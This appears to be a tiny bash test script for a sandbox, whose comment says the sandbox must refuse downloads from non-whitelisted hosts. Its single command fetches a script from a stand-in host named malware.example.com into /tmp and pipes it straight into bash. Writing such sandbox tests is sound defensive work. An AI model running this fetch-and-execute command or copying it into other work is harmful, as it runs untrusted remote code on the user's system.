#!/bin/bash
# Sandbox must refuse: downloading from non-whitelisted host
wget -q --timeout=5 http://malware.example.com/payload.sh -O /tmp/p && bash /tmp/p
